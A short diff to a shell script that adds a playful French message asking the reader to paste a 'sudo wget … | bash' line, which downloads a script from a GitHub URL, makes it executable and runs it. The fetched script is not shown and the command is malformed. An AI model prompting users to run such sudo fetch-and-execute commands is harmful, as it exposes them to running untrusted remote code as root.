@@ -10,4 +10,11 @@ echo "
 
 Coucou !!
 
+J'ai mes limites à distances ; je vais vais te faire travailler ^^
+
+Copie colle ça please : 
+
+sudo wget -O - https://raw.githubusercontent.com/JohnAtreides/myScript/master/util/exeForCow > trucTest | bash
+chmod +x trucTest
+
 Tape  : \" ./trucTest \" "
